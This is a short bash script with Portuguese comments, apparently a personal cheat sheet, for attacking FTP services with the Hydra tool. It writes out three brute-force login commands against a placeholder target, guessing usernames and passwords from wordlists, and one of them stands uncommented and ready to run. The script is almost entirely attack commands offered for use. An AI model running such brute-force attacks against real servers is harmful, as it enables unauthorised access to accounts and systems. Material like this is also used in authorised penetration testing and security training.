#! /bin/bash
#Autor: Joao Nossol
#github: https://github.com/joaonossolb

#Atacando serviços FTP com Hydra

#Realiza Brute Force no usuario e na senha
#hydra -L wordlistUsuarios.txt -P wordlistSenhas.txt -v <TARGET> ftp

#Realiza Brute force apenas no usuario
#hydra -L wordlistUsuarios.txt -p senha que eu sei -v <TARGET> ftp

#Realiza Brute force apenas na senha
hydra -l usuario -P wordlistSenhas.txt -v <TARGET> ftp

